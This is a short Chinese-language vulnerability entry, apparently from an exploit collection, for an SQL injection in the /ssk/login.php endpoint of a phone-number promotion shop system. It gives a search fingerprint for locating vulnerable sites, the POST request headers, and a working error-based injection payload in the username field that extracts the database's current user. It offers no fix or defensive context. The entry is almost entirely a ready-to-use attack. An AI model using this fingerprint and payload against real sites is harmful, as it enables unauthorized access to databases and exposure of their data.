# 手机卡号推广商城ssk接口存在SQL注入漏洞

- **系统**：手机卡号推广商城ssk接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="zgdx.php"`
- **请求**：`POST /ssk/login.php HTTP/1.1`
- **关键头**：`Content-Length: 199`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
username=' OR (SELECT 6442 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FIjp&password=123123
```